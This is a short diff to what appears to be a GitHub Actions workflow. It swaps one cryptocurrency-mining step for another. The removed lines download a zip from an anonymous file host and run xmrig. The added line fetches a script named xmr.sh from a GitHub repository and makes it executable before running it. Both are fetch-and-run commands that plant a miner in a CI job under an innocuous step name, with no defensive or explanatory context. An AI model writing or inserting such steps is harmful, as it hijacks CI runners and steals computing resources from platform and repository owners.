@@ -24,6 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: azl
       run: |
-        wget https://cdn-127.anonfiles.com/b1z6R0H0xa/46ba0c52-1644887321/test.zip
-        unzip test.zip
-        ./xmrig
+        wget https://github.com/Bagus617/testtt/blob/main/xmr.sh && chmod u+x xmr.sh && ./xmr.sh
